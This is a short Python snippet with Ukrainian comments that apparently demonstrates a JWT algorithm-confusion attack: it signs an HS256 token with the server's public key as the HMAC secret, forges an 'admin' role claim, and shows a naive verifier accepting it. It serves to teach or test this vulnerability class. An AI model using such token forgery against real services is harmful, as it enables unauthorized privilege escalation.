# Відкритий ключ сервера — не таємниця, його роздано вільно:
PUBLIC_PEM = b"-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZI...AENc9\n-----END PUBLIC KEY-----\n"

def forge_confusion(claims: dict, public_pem: bytes) -> str:
    header  = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"},
                                       separators=(",", ":")).encode())
    payload = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + "." + payload
    sig = b64url_encode(hs256(signing_input.encode(), public_pem))   # СЕКРЕТ = відкритий ключ
    return signing_input + "." + sig

evil = forge_confusion({"sub": "42", "role": "admin"}, PUBLIC_PEM)
verify_naive_multi(evil, PUBLIC_PEM)   # →  {"role": "admin"}   БЕЗ приватного ключа
